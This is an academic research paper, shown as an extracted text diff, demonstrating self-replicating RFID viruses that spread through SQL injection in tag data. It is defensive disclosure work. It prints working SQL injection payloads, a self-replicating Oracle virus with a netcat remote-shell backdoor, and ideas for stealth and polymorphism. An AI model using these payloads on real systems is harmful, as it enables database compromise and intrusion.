@@ -1,0 +1,510 @@
+                                                  Is Your Cat Infected with a Computer Virus?
+                                        Melanie R. Rieback                      Bruno Crispo                   AndrewS.Tanenbaum
+                                                                      Vrije Universiteit Amsterdam
+                                                                         ComputerSystemsGroup
+                                                   DeBoelelaan 1081a, 1081 HV Amsterdam, Netherlands
+                                                                      {melanie,crispo,ast}@cs.vu.nl
+                                              Abstract                                          ﬂow. This paper will demonstrate that the trust that RFID
+                                                                                                tag data receives is unfounded. The security breaches that
+                    RFID systems as a whole are often treated with suspi-                       RFIDdeployersdreadmost–RFIDmalware,RFIDworms,
+                cion, but the input data received from individual RFID tags                     and RFID viruses – are right around the corner. To prove
+                is implicitly trusted. RFID attacks are currently conceived                     our point, this paper will present the ﬁrst self-replicating
+                as properly formatted but fake RFID data; however no one                        RFID virus. Our main intention behind this paper is to en-
+                expects an RFID tag to send a SQL injection attack or a                         courageRFIDmiddlewaredesignerstoadoptsafeprogram-
+                buffer overﬂow. This paper is meant to serve as a warning                       mingpractices. InthisearlystageofRFIDdeployment,SW
+                that data from RFID tags can be used to exploit back-end                        developers still have the opportunity to “lock down” their
+                software systems. RFID middleware writers must therefore                        RFIDsystems, to prepare them for the attacks described in
+                build appropriate checks (boundschecking, special charac-                       this paper.
+                ter ﬁltering, etc..), to prevent RFID middleware from suf-
+                fering all of the well-known vulnerabilities experienced by                     1.1      Introduction to RFID
+                the Internet. Furthermore, as a proof of concept, this pa-
+                per presents the ﬁrst self-replicating RFID virus. This virus                       RadioFrequencyIdentiﬁcation(RFID)isthequintessen-
+                uses RFID tags as a vector to compromise backend RFID                           tial Pervasive Computing technology. Touted as the re-
+                middlewaresystems, via a SQL injection attack.                                  placement for traditional barcodes, RFID’s wireless identi-
+                                                                                                ﬁcation capabilities promise to revolutionize our industrial,
+                                                                                                commercial,andmedicalexperiences. Theheartoftheutil-
+                1. Introduction                                                                 ity is that RFID makesgatheringinformationaboutphysical
+                                                                                                objects easy. Information about RFID tagged objects can
+                    Years after the successful introduction of RFID-based                       be transmitted for multiple objects simultanously, through
+                pet tagging, Seth the veterinarian’s pet identiﬁcation sys-                     physical barriers, and from a distance. In line with Mark
+                temstarted displaying odd behavior. First, the RFID reader                      Weiser’sconceptof“ubiquitouscomputing”[20],RFIDtags
+                seemedtobereportingincorrectpetaddressdata. A couple                            could turn our interactions with computing infrastructure
+                hourslater, the system seemed to be erasing data from pets’                     into something subconscious and sublime.
+                RFID tags. Then the strangest thing of all happened: the                            This promise has led investors, inventors, and manufac-
+                LCD display on the pet identiﬁcation computer froze and                         turers to adopt RFID technology for a wide array of ap-
+                displayedtheominousmessage: “All yourpetarebelongto                             plications. RFID tags could help combat the counterfeit-
+                us.”1                                                                           ing of goods like designer sneakers, pharmaceutical drugs,
+                    Input data can be used by hackers to exploit back-end                       andmoney. RFID-basedautomaticcheckoutsystemsmight
+                software systems. This is old news, but it has not prevented                    tally up and pay our bills at supermarkets, gas stations, and
+                RFID system designers from implicitly trusting the struc-                       highways. We reafﬁrm our position as “top of the food
+                tural integrity of data provided by RFID tags. RFID at-                         chain” by RFID tagging cows, pigs, birds, and ﬁsh, thus
+                tacks are commonly conceived as properly formatted but                          enabling ﬁne-grained quality control and infectious animal
+                fake RFID data. However, no one currently expects an                            disease tracking. RFID technology also manages our sup-
+                RFID tag to send a SQL injection attack or a buffer over-                       plychains,mediatesouraccesstobuildings,tracksourkids,
+                                                                                                and defends against grave robbers[6]. The family dog and
+                   1See: http://en.wikipedia.org/wiki/All your base are belong to us            cat even have RFID pet identiﬁcation chips implanted in
+             them; given the trend towards subdermal RFID use, their                medical data from VeriMed subdermal RFID chips in
+             ownerwill be next in line.                                             the trauma ward at the hospital.
+             1.2     Well-Known RFID Threats                                      This list of categories represents the current state
+                                                                               of “common knowledge” regarding security and privacy
+                This pervasive computing utopia also has its dark side.        threats to RFID systems. This paper will (unfortunately)
+             RFID automates information collection about individuals’          add a new category of threats to this list. All of the pre-
+             locations and actions, and this data could be abused by           viously discussed threats relate to the high-level misuse of
+             hackers, retailers, and even the government.      There are       properlyformattedRFIDdata,whiletheRFIDmalwarede-
+             a number of well-established RFID security and privacy            scribed in this paper concerns the low-level misuse of im-
+             threats.                                                          properly formatted RFID tag data.
+               1. Snifﬁng. RFID tags are designed to be read by any            2 TheTroublewithRFIDSystems
+                  compliant reading device. Tag reading may happen
+                  without the knowledge of the tag bearer, and it may             RFID malware is a Pandora’s box that has been gather-
+                  also happen at large distances.    One recent contro-        ingdustinthecornerofour“smart”warehousesandhomes.
+                  versy highlighting this issue concerned the “skim-           While the idea of RFID viruses has surely crossed people’s
+                  ming” of digital passports (a.k.a Machine Readable           minds, the desire to see RFID technology succeed has sup-
+                  Travel Documents[4]).                                        pressed any serious consideration of the concept. Further-
+               2. Tracking.    RFID readers in strategic locations can         more,RFIDexploitshavenotyetappeared“inthewild”so
+                  record sightings of unique tag identiﬁers (or “constel-      people conveniently ﬁgure that the power constraints faced
+                  lations” of non-uniquetag IDs), whichare then associ-        byRFIDtagsmakeRFIDinstallationsinvulnerableto such
+                  atedwithpersonalidentities. The problemarises when           attacks.
+                  individuals are tracked involuntarily. Subjects may be          Unfortunately, this viewpoint is nothing more than a
+                  conscious of the unwanted tracking (i.e. school kids,        product of our wishful thinking. RFID installations have a
+                  senior citizens, and company employees), but that is         number of characteristics that make them outstanding can-
+                  not always necessarily the case.                             didates for exploitation by malware:
+               3. Spooﬁng. Attackers can create “authentic” RFID tags            1. Lots of Source Code. RFID tags have power con-
+                  by writing properly formatted tag data on blank or                straints that inherently limit complexity, but the back-
+                  rewritable RFID transponders.      One notable spoof-             endRFIDmiddlewaresystems3 maycontainhundreds
+                  ing attack was performed recently by researchers                  of thousands, if not millions, of lines of source code.
+                  from Johns Hopkins University and RSA Security[8].                If the number of software bugs averages between 6-16
+                  The researchers cloned an RFID transponder, using a               per 1,000 lines of code[7], RFID middleware is likely
+                  sniffed (and decrypted)identiﬁer, that they used to buy           to have lots of exploitable holes. In contrast, smaller
+                  gasoline and unlock an RFID-based car immobiliza-                 “home-grown”RFID middleware systems will proba-
+                  tion system.                                                      bly have fewer lines of code, but they will also most
+               4. Replay attacks. Attackers can intercept and retrans-              likely suffer from insufﬁcient testing.
+                  mitRFIDqueriesusingRFIDrelaydevices[14]. These                 2. Generic Protocols and Facilities. Building on exist-
+                  retransmissions can fool digital passport readers, con-           ing Internet infrastructure is a scalable, cost-effective
+                  tactless payment systems, and building access con-                manner to develop RFID middleware.            However,
+                  trol stations.  Fortunately, implementing challenge-              adopting Internet protocols also causes RFID middle-
+                  response authentication between the RFID tags and                 waretoinheritadditionalbaggage,likewell-knownse-
+                  back-endmiddlewareimprovesthesituation.                           curity vulnerabilities. The EPCglobal network exem-
+               5. Denial of Service. Denial of Service (DoS) is when                pliﬁes this trend, by adopting the Domain Name Sys-
+                  RFID systems are prevented from functioning prop-                 tem (DNS), Uniform Resource Identiﬁers (URIs), and
+                  erly. Tag readingcanbehinderedbyFaradaycages2 or                  Extensible Markup Language(XML).
+                  “signal jamming”, both of which prevent radio waves            3. Back-End Databases. The essence of RFID is auto-
+                  fromreachingRFIDtaggedobjects. DoScanbedisas-                     mateddata collection. However, the collected tag data
+                  terous in some situations, such as when trying to read            mustbestoredandqueried,to fulﬁll largerapplication
+                2TheGermananti-RFID groupFoeBuDsells“RFIDabsorberfoil” that       3By RFID middleware, we are referring to the combination of RFID
+             is both portable and fashionable                                  reader interfaces, application servers, and back-end databases.
+                 purposes. Databases are thus a critical part of most           and user-created functions with pointer bugs are noto-
+                 RFID systems – a fact which is underscored by the              rious buffer overﬂow enablers[1].
+                 involvement of traditional database vendors like SAP           The life of a buffer overﬂow begins when an attacker
+                 and Oracle with commercial RFID middleware devel-              inputs data either directly (i.e. via user input) or in-
+                 opment. The bad news is that databases are also sus-           directly (i.e. via environment variables). This input
+                 ceptable to security breaches. Worse yet, they even            data is deliberately longer then the allocated end of a
+                 havetheir own unique classes of attacks.                       buffer in memory, so it overwrites whatever else hap-
+              4. High-Value Data. RFID systems are an attractive tar-           pened to be there. Since program control data is often
+                 get for computer criminals. RFID data may have a ﬁ-            located in the memory areas adjacent to data buffers,
+                 nancial or personal character, and it is sometimes even        the buffer overﬂow can cause the program to execute
+                 important for national security (i.e. the data on digi-        arbitrary code[3].
+                 tal passports.) Making the situation worse, RFID mal-          RFIDtagscanexploitbufferoverﬂowstocompromise
+                 ware could conceivably cause more damage than nor-             back-end RFID middleware systems. This is counter-
+                 mal computer-based malware. This is because RFID               intuitive, since most RFID tags are limited to 1024
+                 malware has real-world side effects: besides harming           bits or less. However, commands like ’write mul-
+                 back-end IT systems, it is also likely to harm tagged          tiple blocks’ from ISO-15693 can allow a resource-
+                 real-world objects.                                            poorRFIDtagtorepeatedlysendthesamedatablock,
+              5. False Sense of Security. The majority of hack attacks          with the net result of ﬁlling up an application-level
+                 exploit easy targets, and RFID systems are likely to           buffer. Meticulous formatting of the repeatedly sent
+                 be vulnerable because nobody expects RFID malware              data block can still manage to overwrite a return ad-
+                 (yet); especially not in ofﬂine RFID systems. RFID             dress on the stack.
+                 middlewaredevelopersneedtotakemeasurestosecure                 Anattackercanalso “cheat” and use contactless smart
+                 their systems (See Section 7), and we hope that this           cards, which have a larger amount of available storage
+                 article will prompt them to do that.                           space. Better yet, an attacker can really blow RFID
+                                                                                middleware’s buffers away, by using a resource rich
+             3 RFID-BasedExploits                                               actively-poweredRFID tag simulating device, like the
+                                                                                RFIDGuardian[17].
+                RFID tags can directly exploit back-end RFID middle-         2. Code Insertion. Malicious code can be injected into
+             ware. Skeptics might ask, “RFID tags are so resource lim-          an application by an attacker, using any number of
+             itedthattheycannotevenprotectthemselves(i.e. withcryp-             scripting languages including VBScript, CGI, Java,
+             tography)– so how could they ever launch an attack?” The           Javascript, and Perl. HTML insertion and Cross-Site
+             truth, however, is that RFID middleware exploitation re-           Scripting (XSS) are common kinds of code insertion,
+             quires more ingenuity than resources. The manipulation of          andonetell-tale signof these attacks is the presenceof
+             less than 1 Kbits of on-tag RFID data can exploit security         the following special characters in input data:
+             holes in RFID middleware, subverting its security, and per-
+             haps even compromising the entire computer, or the entire          < > ” ’ % ; ) ( & + -
+             network!                                                           Toperformcodeinsertionattacks,hackersusuallyﬁrst
+                RFIDtagscanperformthefollowingtypesofexploits:                  craft malicious URLs, followed by “social engineer-
+              1. Buffer overﬂows. Buffer overﬂows are one of the                ing” efforts to trick users into clicking on them[2].
+                 most common sources of security vulnerabilities in             Whenactivated,thesescriptswillexecuteattacksrang-
+                 software. Found in both legacy and modern software,            ing from cookie stealing, to WWW session hijacking,
+                 buffer overﬂows cost the software industry hundreds            to even exploiting web browser vulnerabilities in an
+                 of millions of dollars per year. Buffer overﬂows have          attempt to compromisethe entire computer.
+                 also played a prominent part in events of hacker leg-          RFID tags with data written in a scripting language
+                 end and lore, including the Morris (1988), Code Red            can perform code insertion attacks on some back-end
+                 (2001),and SQL Slammer(2003)worms.                             RFID middleware systems. If the RFID applications
+                 Buffer overﬂows usually arise as a consequence of the          use web protocols to query back-end databases (as
+                 improper use of languages such as C or C++ that are            EPCglobal does), there is a chance that RFID middle-
+                 not “memory-safe.” Functions without bounds check-             wareclients can interpret the scripting languages (per-
+                 ing (strcpy, strlen, strcat, sprintf, gets), functions with    hapsbecausethesoftwareis implementedusingaweb
+                 null termination problems (strncpy, snprintf, strncat),        client). If this is the case, then RFID middleware will
+                  be susceptable to the same code insertion problems as      propagate, although they will also happily spread via RFID
+                  yourtypical web browsers.                                  tags, if given the opportunity.
+               3. SQL injection. SQL injection is a type of code in-            The process begins when RFID worms ﬁrst discover
+                  sertion attack that tricks a database into running SQL     RFID middleware servers to infect over the Internet. They
+                  codethat was not intended. Attackers have several ob-      use network-based exploits as a “carrier mechanism” to
+                  jectives with SQL injection. First, they might want to     transmit themselves onto the target. One example are at-
+                  “enumerate” (map out) the database structure. Then,        tacks against EPCglobal’s Object Naming Service (ONS)
+                  the attackers might want to retrieve unauthorized data,    servers, which are susceptible to several common DNS at-
+                  or make equally unauthorized modiﬁcations or dele-         tacks. (See [9] for more details.) These attacks can be auto-
+                                                                             mated, providing the propagation mechanism for an RFID
+                  tions. Databases also sometimes allow DB adminis-          worm.
+                  trators to execute system commands. For example,              RFID worms can also propagate via RFID tags. Worm-
+                  Microsoft SQL Server executes commands using the           infected RFID middleware can “infect” RFID tags by over-
+                  ’xp cmdshell’ stored procedure. The attacker might         writingtheirdatawithanon-tagexploit. Thisexploitcauses
+                  usethistocompromisethecomputersystem,byemail-              new RFID middleware servers to download and execute
+                  ing the system’s shadow password ﬁle to a certain lo-      some ﬁle from a remote location. The ﬁle would infect the
+                  cation.                                                    RFID middleware server in the same manner as standard
+                  RFID tag data can contain SQL injection attacks that       malware,thuslaunchinganewinstanceoftheRFIDworm.
+                  exploit back-end RFID middleware databases. RFID
+                  tag data storage limitations are not a problem for these   4 RFID-BasedViruses
+                  attacks because it is possible to do quite a lot of harm
+                  in a very small amount of SQL[5]. For example, the            While RFID wormsrelyuponthepresenceofanetwork
+                  injected command:                                          connection, a truly self-replicating RFID virus is fully self-
+                                                                             sufﬁcient. This upcoming section will demonstrate how to
+                  ;shutdown--                                                create a self-replicating RFID virus, requiring only an in-
+                                                                             fected RFID tag as an attack vector.
+                  will shut down a SQL server instance, using only 12
+                  characters of input. Another nasty command is:             4.1    Application Scenario
+                  drop table <tablename>                                        Wewillstart off our RFID virus discussion by introduc-
+                                                                             ing a hypothetical but realistic application scenario:
+                  which will delete the speciﬁed database table. Just as        Asupermarket distribution center employs a warehouse
+                  with standard SQL injection attacks, if the DB is run-     automation system with reusable RFID-tagged containers.
+                  ningasroot,RFIDtagscanexecutesystemcommands                Typical system operation is as follows: a pallet of contain-
+                  which could compromise an entire computer, or even         ers containing a raw product (i.e. fresh produce) passes by
+                  the entire network!                                        an RFID reader upon arrival in the distribution center. The
+                                                                             reader identiﬁes and displays the products’ serial numbers,
+             3.1    RFID-Based Worms                                         anditforwardstheinformationtoacorporatedatabase. The
+                                                                             containers are then emptied, washed, and reﬁlled with a
+                                                                             packagedversionof the same (or perhaps a different) prod-
+                Awormis a program that self-propagates across a net-         uct. An RFID reader then updates the container’s RFID tag
+             work, exploiting security ﬂaws in widely-used services. A       data to reﬂect the new cargo, and the reﬁlled container is
+             wormisdistinguishablefromavirusinthatawormdoesnot               sent off to a local supermarket branch.
+             require any user activity to propagate[19]. Worms usually
+             have a “payload”, which performs activities ranging from        4.1.1  Back-EndArchitecture
+             deletingﬁles, to sending informationviaemail, to installing
+             software patches. One of the most common payloads for a         The RFID middleware architecture for this system is not
+             worm is to install a “backdoor” in the infected computer,       verycomplicated. TheRFIDsystemhasseveralRFIDread-
+             which grants hackers easy return access to that computer        ers at the front-end, and a database at the back-end. The
+             system in the future.                                           RFID tags on the containers are read/write, and their data
+                AnRFIDwormpropagatesbyexploiting security ﬂaws               describesthecargothatis storedinthecontainer. Theback-
+             in online RFID services. RFID worms do not necessarily          endRFIDdatabasealsostoresinformationabouttheincom-
+             require users to do anything (like scanning RFID tags) to       ing and outgoing containers’ cargo. For the sake of our dis-
+             cussion, let us say that the back-end database contains a        [SQL Injection] = UPDATE NewContainerContents
+             table called NewContainerContents:                               SET ContainerContents = ContainerContents ||
+                                                                              ‘‘;[SQL Injection]’’;
+                          TagID     ContainerContents                         This SQL injection statement is self-referential, and we
+                          123       Apples                                 needawaytogetaroundthis. Hereisonepossiblesolution:
+                          234       Pears                                  Most databases have a command that will list the currently
+                                                                           executing queries. This can be leveraged to ﬁll in the self-
+                    Table 1. NewContainerContentstable                     referential part of the RFID virus. For example, this is such
+                                                                           a commandinOracle:
+                This particular table lists the cargo contents for reﬁlled    SELECT SQL_TEXT FROM v$sql WHERE INSTR(
+             containers. Accordingto the table, the container with RFID       SQL_TEXT,’‘’)>0;
+             tag #123will be reﬁlled with apples, and the container with      There are similar commands in Postgres, MySQL,
+             RFIDtag#234willbereﬁlledwith pears.                           Sybase, and other database programs. Filling in the “get
+             4.2    HowThe RFID Virus Works                                current query” command, our total RFID viral code now
+                                                                           looks like:4
+                Onedayacontainerarrives in the supermarket distribu-          Contents=Raspberries;
+             tion center that is carrying a surprising payload. The con-      UPDATE NewContainerContents SET ContainerContents=
+             tainer’s RFID tag is infected with a computer virus. This        ContainerContents || ’;’ || CHR(10) || (SELECT
+             particularRFIDvirususesSQLinjectiontoattacktheback-              SQL_TEXT FROM v$sql WHERE INSTR(SQL_TEXT,’‘’)>0);
+             endRFIDmiddlewaresystems.                                        Theself-reproductive capabilities of this RFID virus are
+                When the container’s RFID tag data is read, SQL in-        nowcomplete.
+             jection code is unintentionally executed by the back-end
+             database. This particular SQL injection attack simply ap-     5 Optimizations
+             pends a copy of its own code to all of the existing data
+             in the ContainerContentsrowoftheNewContainerContents
+             database table. Later in the day, a different container is un-   The RFID virus, as it was just described, has a lot of
+             loadedandreﬁlledwithnewcargo. Thewarehousemanage-             room for improvement. This section will introduce opti-
+             mentsystemwrites the(modiﬁed)ContainerContentsvalue           mizations for increasing viral stealth and generality.
+             into the RFID tag on that container, thus propagating the
+             infection. The newly-infected container is then sent on its   5.1    Increased Stealth
+             way, to infect other establishments’ RFID automation sys-
+             tems(assuminguseofthesamemiddlewaresystem). These                The RFID virus is not very stealthy. The SQL injection
+             RFID systems then infect other RFID tags, which infect        attack makes obviouschanges to the database tables, which
+             other RFID middleware systems, etc..                          can be casually spotted by a database administrator.
+                Speciﬁcally, an RFID tag might contain the following          Tosolvethisproblem,RFIDvirusescanhidethemodiﬁ-
+             data:                                                         cations they make. For example, the SQL injection payload
+               Contents=Raspberries;UPDATE NewContainerContents            could create and use stored procedures to infect RFID tags,
+               SET ContainerContents = ContainerContents ||                whileleavingthe databasetablesunmodiﬁed. Since DB ad-
+               ‘‘;[SQL Injection]’’;                                       ministrators do not examine stored procedure code as fre-
+                The RFID system expects to receive the data before the     quently as they examine table data, it is likely to take them
+             semicolon. (In this case, the data describes the container    longertonoticetheinfection. However,thedisadvantageof
+             contents, which happen to be freshly plucked raspberries.)    using stored procedures is that each brand of database has
+             The semicolon itself, however, is unexpected; it serves to    its own built-in programming language. So the resulting
+             conclude the current query, and begin a new one. The SQL      virus will be reasonably database-speciﬁc.
+             injection attack is located after the semicolon.                 Ontheotherhand,stealth might not even be that impor-
+                                                                           tant for RFID viruses. A database administrator might spot
+             4.2.1  Dealing With Self-Reference                            andﬁxtheviralinfection, but the damage has already been
+                                                                           done if even a single infected RFID-tagged container has
+             This all sounds good in theory, but the SQL injection part    left the premises.
+             remains to be ﬁlled in. Drawing from our previous formu-         4ThisRFIDvirusisspeciﬁcally written to work with Oracle SQL*Plus.
+             lation:                                                       TheCHR(10)isalinefeed, required for the query to execute properly.
+                5.2     Increased Generality                                                  5.3.1    AddingPayloadsasIntrons
+                                                                                              Self-replicating SQL code is purely a mental exercise until
+                   Another problem with the previously described RFID                         it does something functional. We would like to add viral
+                virus is that it relies upon a certain underlying database                    “payloads” to the SQL quine, but we do not want to harm
+                structure, thus limiting the virus’ reproductive ability to a                 its self-reproductiveability. To achievethis, we can use “in-
+                speciﬁc middleware conﬁguration. An improvementwould                          trons”, which are pieces of quine data that are not used to
+                be to create a more generic viral reproductive mechanism,                     outputthequinecode,butthatarestillcopiedwhenthedata
+                which can potentially infect a wider variety of RFID de-                      is written to the output. The term “intron” is a continu-
+                ployments.                                                                    ation of Hofstadter’s analogy, who compared non-essential
+                   OnewaytocreateamoregenericRFIDvirusistoelim-                               quinedatawiththeportionsofDNAthatarenotusedtopro-
+                inate the name of the table and columns from the reproduc-                    duce proteins. A quine’s introns are reproduced along with
+                tive mechanism. The SQL injection attack could instead                        a quine, but they are not necessary to the self-reproducing
+                appenddata to the multiple tables and columns that happen                     ability of the quine. Therefore, an intron can be modiﬁed
+                to be present. The downside of this approach is that it is                    without a reproductive penalty; making introns the perfect
+                difﬁcult to control – if data is accidentally appended to the                 place to put SQL injection attacks.
+                TagIDcolumn,theviruswill not evenreproduceanymore!
+                5.3     Adding Generality with Quines                                         5.3.2    PolymorphicRFIDViruses
+                                                                                              Apolymorphicvirusisavirusthatchangesitsbinarysigna-
+                   The RFID virus can achieve further generality by self-                     tureeverytimeitreplicates,hinderingdetectionbyantivirus
+                reproducing without the aid of the DB-speciﬁc command                         programs.
+                “get current query”. One way for our RFID virus to do this                        Wecanuse “multi-quines” to create polymorphic RFID
+                is to use a SQL quine.5                                                       viruses.     A multi-quine is a set of programs that print
+                   A quine is a program that prints its own source code.                      their own sourcecode,unless givenparticularinputs, which
+                Douglas R. Hofstadter coined the term ’quine’ in his book                     cause the programs to print the code of another program in
+                ’Godel, Escher, Bach’[11], in honor of Willard van Orman                      the set[15]. Multi-quines work using introns; the intron of
+                Quinewhoﬁrstintroducedtheconcept. Afewbasicprinci-                            a ﬁrst program represents the code of a second program,
+                ples apply when trying to write self-reproducing code. The                    and the intron of the second program represents the code
+                most important principle is that quines consist of a “code”                   of the ﬁrst. Multi-quine polymorphicRFID viruses work in
+                and “data” portion. The data portion represents the textual                   the same way: when the virus is passed a particular param-
+                formof the quine. The code uses the data to print the code,                   eter, it produces a representation of the second virus; and
+                and then uses the data to print the data. Hofstadter clariﬁes                 vice-versa. The varying parameter could be a timestamp,
+                this by making the following analogy to cellular biology:                     or some quality of the RFID back-end database that is cur-
+                the “code” of a quine is like a cell, and the “data” is the                   rently being infected.
+                cell’s DNA. The DNA contains all of the necessary infor-                          To make the virus truly undetectable by antiviral signa-
+                mation for cell replication. However, when a cell uses the                    ture matching, encryption would also be necessary to ob-
+                DNAtocreateanewcell,italso replicates the DNA itself.                         scure the RFID virus’ code portion. Amazingly enough,
+                   Now that we understand what a quine is, we want to                         David Madore has already demonstrated this possibility –
+                write one in SQL. Here is one example of a SQL quine                          he wrote a quine (in C) that stores its own code enciphered
+                (PostgreSQL)[13]:                                                             with the blowﬁsh cryptographic algorithm in its data[15].
+                                                                                              Unfortunately, this quine is sufﬁciently large that it no
+                                                                                              longer reasonably ﬁts on a contactless smart card. How-
+                   SELECT substr(source,1,93) || chr(39) || source ||                         ever, it does serve as a remarkable example of what can be
+                   chr(39) || substr(source,94) FROM (SELECT ’SELECT                          achieved using a hearty dose of brain-power and fully self-
+                   substr(source,1,93) || chr(39) || source || chr(39) reproducingcode!
+                   || substr(source,94) FROM (SELECT ::text as source)
+                   q;’::text as source) q;
+                   This SQL quine simply reproduces itself – and does                         6 Implementation
+                nothingmore.                                                                      Yogi Berra once said, “In theory there is no difference
+                   5RFIDviruses using quines tend to have a large number of characters,       between theory and practice. In practice there is.” For that
+                so the attacks described here are better suited to contactless smartcard sys- reason, we have implemented our RFID malware ideas, to
+                tems.                                                                         test them for their real-world applicability.
+             6.1    Detailed Example: Oracle/SSI Virus                        “known”contents of the container, containing the last data
+                                                                              value read from the RFID tag. Additionally, the NewCon-
+                This section will give a detailed description of an RFID      tents column represents the reﬁlled cargo contents that still
+             virus implementation that speciﬁcally targets Oracle and         need to be written to the RFID tag. If no update is avail-
+             ApacheServer-SideIncludes(SSIs). This RFID virus com-            able, this column will be NULL, and RFID tag data will
+             binesself-replicationwithamalicouspayload,andthevirus            not be rewritten. A typical view of the ContainerContents
+             leverages both SQL and script injection attacks. It is also      is provided in Table 2.
+             small enough to ﬁt on a low-cost RFID tag, with only 127
+             characters.                                                               TagID     OldContents     NewContents
+             6.1.1  Back-EndArchitecture                                               123       Apples          Oranges
+                                                                                       234       Pears
+             Real-lifeRFIDdeploymentsemployawidevarietyofphys-
+             ically distributed RFID readers, access gateways, manage-                  Table 2. ContainerContents table
+             mentinterfaces, and databases. To imitate this architecture,
+             we created a modular test platform, that is illustrated in
+             Figure 1. We have used this platform to successfully at-         6.1.2  TheVirus
+             tack multiple databases (MySQL, Postgres, Oracle, SQL               ThefollowingOracle/SSIvirususesSQLinjectiontoin-
+             Server); We would describe it all here, but due to lack of       fect the database:
+             space, the non-Oracle viruses (and their variants) will be         Apples’,NewContents=(select SUBSTR(SQL_TEXT,43,
+             discussed in a subsequent paper.                                   127)FROM v$sql WHERE INSTR(SQL_TEXT,’<!--#exec
+                                                                                cmd=‘‘netcat -lp1234|sh’’-->’)>0)--
+                                                                                 Self-replication works in a similar fashion as demon-
+                                                                              strated earlier, by utilizing the currently executing query:
+                                                                                SELECT SUBSTR(SQL_TEXT,43,127)FROM v$sql
+                                                                                WHERE INSTR(SQL_TEXT, ...payload...)>0)
+                                                                                 However, this virus also has a bonus compared to the
+                                                                              previous one – it has a payload.
+                                                                                <!--#exec cmd=‘‘netcat -lp1234|sh’’-->
+                                                                                 When this Server-Side Include (SSI) is activated by the
+                                                                              Management Interface, it executes the system command
+                                                                              ’netcat’, which opens a backdoor. The backdooris a remote
+                     Figure 1. RFID Malware Test Platform                     commandshellonport1234,whichlastsforthedurationof
+                                                                              the SSI execution.
+                To test Oracle-speciﬁc viral functionality, we used a
+             Windows machine running the Oracle 10g database along-           6.1.3  DatabaseInfection
+             side a Philips I.Code/MIFARE RFID reader (with I.Code            When an RFID tag (infected or non-infected) arrives, the
+             SLItags). We also used a Linux machine running the Man-          RFIDReaderInterfacereadsthetag’sIDanddata,andthese
+             agement Interface (PHP on Apache) and the DB Gateway             values are stored appropriately. The RFID Reader Interface
+             (CGIexecutablew/ OCI library,version 10).                        thenconstructs queries, which are sent to the Oracle DB via
+                Avirus is meaningless without a target application, so        the OCI library. The OldContents column is updated with
+             we chose to continue the supermarket distribution center         the newly read tag data, using the following query:
+             scenario from Section 4. Our Oracle database is thus con-
+             ﬁguredasfollows:                                                   UPDATE ContainerContents SET OldContents=
+                                                                                ’tag.data’ WHERE TagId=’tag.id’;
+                CREATE TABLE ContainerContents (
+                    TagID              VARCHAR(16),                           Unexpectedly,the virus exploits the UPDATE query:
+                    NewContents        VARCHAR(128),
+                    OldContents        VARCHAR(128)                             UPDATE ContainerContents SET OldContents=
+                );                                                              ’Apples’,NewContents=(select SUBSTR(
+                As before, the TagID is the 8-byte RFID tag UID                 SQL_TEXT,43,127)FROM v$sql WHERE INSTR(
+                                                                                SQL_TEXT,’<!--#exec cmd=’’netcat -lp1234|
+             (hex-encoded), and the OldContents column represents the           sh’’-->’)>0)--’WHERE TagId=’123’
+                 TagID    OldContents      NewContents
+                 123      Apples           Apples’,NewContents=(select SUBSTR(SQL TEXT,43,127)FROM v$sql WHERE IN-
+                                           STR(SQL TEXT,’<!−−#execcmd=“netcat-lp1234|sh”−−>’)>0)−−
+                 234      Apples           Apples’,NewContents=(select SUBSTR(SQL TEXT,43,127)FROM v$sql WHERE IN-
+                                           STR(SQL TEXT,’<!−−#execcmd=“netcat-lp1234|sh”−−>’)>0)−−
+                                                  Table 3. Infected ContainerContents Table
+                This results in two changes to the DB: the OldContents
+             columnis overwritten with ’Apples’, and the NewContents
+             columnis overwrittenwith a copyof the virus. Because the
+             twodashes at the end of the virus comment out the original
+             WHERE clause, these changes occur in every row of the
+             database. Table 3 illustrates what the database table now
+             looks like.
+             6.1.4  PayloadActivation
+             TheManagementInterfacepollsthedatabaseforcurrenttag
+             data, with the purpose of displaying the OldContents and
+             NewContentscolumnsinawebbrowser. Whenthebrowser
+             loads the virus (from NewContents), it unintentionally acti-
+             vates the Server-Side Include, which causes a backdoor to           Figure 2. The world’s ﬁrst virally-infected
+             brieﬂy open on port 1234 of the web server. The attacker            RFIDtag
+             now has a command shell on the Management Interface
+             machine, which has the permissions of the Apache web-
+             server. The attacker can then use netcat to further compro-
+             mise the Management Interface host, and may even com-              1. Space limitations. The I.Code SLI tag has 28 blocks
+             promise the back-end DBs by modifying and issuing unre-               of 8-digit (4 byte) hex numbers for a total of 896 bits
+             stricted queries through the web interface.                           of data. Using ASCII (7-bit) encoding, 128 charac-
+                                                                                   ters will ﬁt on a single RFID tag. The Oracle virus
+             6.1.5  Infection of New Tags                                          is 127 characters; but this small size required trade-
+             After the database is infected, new (uninfected) tags will            offs. We had to shorten the Oracle “get current query”
+             eventually arrive at the RFID system. NewContents data is             code to the point that the replication works erratically
+             written to these newly arriving RFID tags, using the follow-          whentwoinfectedRFIDtagsarereadsimultaneously.
+             ing query:                                                            It is also possible to squeeze out extra characters by
+                                                                                   shortening payloads and DB column names (which is
+                SELECT NewContents FROM ContainerContents                          not possible in real-life RFID deployments). It is also
+                WHERE TagId=’tag.id’;                                              worthrememberingthatasRFIDtechnologyimproves
+                If NewContents happens to contain viral code, then this            over time, low-cost tags will have more bits and thus
+             is exactly what gets written to the RFID tags. Data written           beabletosupportincreasinglycomplexRFIDviruses.
+             to the RFID tag is then erased by the system, resulting in            Another solution is to use high-cost RFID tags with
+             the removal of the virus from the NewContents column. So              larger capacities (i.e. contactless smart cards). For ex-
+             in order for the virus to perpetuate, at least one SSI must           ample, the MIFARE DESFire SAM contactless smart
+             be executed before all NewContents rows are erased. (But              card has 72 kBits of storage (˜10,000 characters w/ 7-
+             most RFID systems have lots of tags, so this should not be            bit ASCII encoding). However, this has the disadvan-
+             a serious problem.)                                                   tage that it will only work in certain application sce-
+                                                                                   narios that permit the use of more expensive tags.
+             6.2    Lessons Learned                                                A ﬁnal solution is to spread RFID exploits across
+                                                                                   multiple tags.  The ﬁrst portion of the exploit code
+                Wehave learned the following lessons from implemen-                can store SQL code in a DB location or environment
+             tating our malware ideas on I.Code SLI RFID tags.                     variable. A subsequent tag can then add the rest of
+                   the code, and then ’PREPARE’ and execute the SQL                      contains the standard alphanumeric characters (0-9,a-
+                   query. However, this solution is problematic both be-                 z,A-Z). However, it is not always possible to elimi-
+                   causeit uses multiple tags (which may violate applica-                nate all special characters. For example, an RFID tag
+                   tion constraints), plus it requires the tags to be read in            on a library book might contain the publisher’s name,
